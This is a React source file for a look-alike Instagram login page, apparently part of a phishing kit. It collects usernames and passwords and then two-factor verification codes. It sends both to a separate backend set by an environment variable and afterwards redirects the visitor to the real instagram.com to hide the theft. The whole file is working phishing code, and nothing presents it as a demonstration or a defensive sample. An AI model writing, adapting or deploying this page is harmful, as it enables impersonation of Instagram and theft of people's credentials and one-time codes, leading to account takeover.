import React, { useState, useEffect } from "react";
import { Eye, EyeOff } from "lucide-react";
import { useNavigate, useLocation } from "react-router-dom";

function InstagramLogin() {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [verificationCode, setVerificationCode] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [is2FARequired, setIs2FARequired] = useState(false);
  const [sessionId, setSessionId] = useState(null);
  const navigate = useNavigate();
  const location = useLocation();

  useEffect(() => {
    const path = location.pathname;
    const match = path.match(/\/accounts\/login\/two_factor\/(.+)/);
    if (match) {
      const session = match[1];
      setSessionId(session);
      setIs2FARequired(true);
    }
  }, [location]);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setIsLoading(true);
    setError("");

    try {
      const response = await fetch(
        `${process.env.REACT_APP_API_URL}/accounts/login`,
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({ username, password }),
          redirect: "follow", // Allow fetch to follow redirects
        }
      );

      if (response.redirected) {
        const redirectUrl = response.url;
        console.log("Redirect URL:", redirectUrl);

        const match = redirectUrl.match(/\/two_factor\/([^?]+)/);
        if (match) {
          const newSessionId = match[1];
          setSessionId(newSessionId);
          setIs2FARequired(true);
          navigate(`/accounts/login/two_factor/${newSessionId}`);
        } else {
          console.error("Unexpected redirect URL format");
        }
      } else if (response.ok) {
        const data = await response.json();
        if (data.success) {
          window.location.href = "https://www.instagram.com";
        } else {
          setError(data.message || "Login failed");
        }
      } else {
        const errorData = await response.json().catch(() => ({}));
        setError(errorData.message || "An error occurred during login.");
      }
    } catch (error) {
      console.error("Login failed:", error);
      setError("An unexpected error occurred. Please try again.");
    } finally {
      setIsLoading(false);
    }
  };

  const handle2FASubmit = async (e) => {
    e.preventDefault();
    setIsLoading(true);
    setError("");

    try {
      const response = await fetch(
        `${process.env.REACT_APP_API_URL}/accounts/login/two_factor/${sessionId}`,
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          // credentials: "include", // Add this
          body: JSON.stringify({
            verificationCode,
          }),
        }
      );

      if (response.ok) {
        const data = await response.json();
        if (data.success) {
          window.location.href = "https://www.instagram.com";
        } else {
          setError(data.message || "Verification failed");
        }
      } else {
        const errorData = await response.json().catch(() => ({}));
        setError(errorData.message || "Verification failed");
      }
    } catch (error) {
      console.error("2FA verification failed:", error);
      setError("An unexpected error occurred during verification");
    } finally {
      setIsLoading(false);
    }
  };

  const togglePasswordVisibility = () => {
    setShowPassword(!showPassword);
  };

  return (
    <div className="flex min-h-screen flex-col items-center justify-center bg-gray-50 p-4">
      <div className="w-full max-w-md">
        <div className="bg-white p-8 rounded-lg shadow-md border border-gray-200 flex flex-col items-center">
          <div className="mb-8">
            <img
              src="/instagram-logo.png"
              alt="Instagram Logo"
              style={{ width: "150px", height: "auto" }}
            />
          </div>

          {!is2FARequired ? (
            // Regular Login Form
            <form onSubmit={handleSubmit} className="w-full space-y-4">
              <input
                type="text"
                placeholder="Phone number, username, or email"
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                className="w-full p-2 border rounded focus:outline-none focus:ring-1 focus:ring-blue-500 focus:border-blue-500"
                required
              />
              <div className="relative">
                <input
                  type={showPassword ? "text" : "password"}
                  placeholder="Password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="w-full p-2 border rounded focus:outline-none focus:ring-1 focus:ring-blue-500 focus:border-blue-500"
                  required
                />
                <button
                  type="button"
                  onClick={togglePasswordVisibility}
                  className="absolute inset-y-0 right-0 pr-3 flex items-center text-sm leading-5"
                >
                  {showPassword ? (
                    <EyeOff className="h-5 w-5 text-gray-500" />
                  ) : (
                    <Eye className="h-5 w-5 text-gray-500" />
                  )}
                </button>
              </div>
              {error && <p className="text-red-500 text-sm">{error}</p>}
              <button
                type="submit"
                disabled={isLoading || !username || !password}
                className={`w-full bg-blue-500 text-white p-2 rounded font-semibold
                  ${
                    isLoading || !username || !password
                      ? "opacity-70 cursor-not-allowed"
                      : "hover:bg-blue-600"
                  }
                  transition-colors duration-200`}
              >
                {isLoading ? "Logging in..." : "Log In"}
              </button>
            </form>
          ) : (
            // 2FA Verification Form
            <form onSubmit={handle2FASubmit} className="w-full space-y-4">
              <p className="text-center text-gray-600 mb-4">
                Enter the verification code sent to your device
              </p>
              <input
                type="text"
                placeholder="Enter verification code"
                value={verificationCode}
                onChange={(e) => setVerificationCode(e.target.value)}
                className="w-full p-2 border rounded focus:outline-none focus:ring-1 focus:ring-blue-500 focus:border-blue-500"
                required
              />
              {error && <p className="text-red-500 text-sm">{error}</p>}
              <button
                type="submit"
                disabled={isLoading || !verificationCode}
                className={`w-full bg-blue-500 text-white p-2 rounded font-semibold
                  ${
                    isLoading || !verificationCode
                      ? "opacity-70 cursor-not-allowed"
                      : "hover:bg-blue-600"
                  }
                  transition-colors duration-200`}
              >
                {isLoading ? "Verifying..." : "Verify"}
              </button>
            </form>
          )}

          <div className="mt-6 text-center">
            <p className="text-sm text-gray-500">
              Don't have an account?{" "}
              <a
                href="https://www.instagram.com/accounts/emailsignup/"
                className="font-semibold text-blue-500 hover:text-blue-600"
              >
                Sign up
              </a>
            </p>
          </div>
        </div>
      </div>
    </div>
  );
}

export default InstagramLogin;
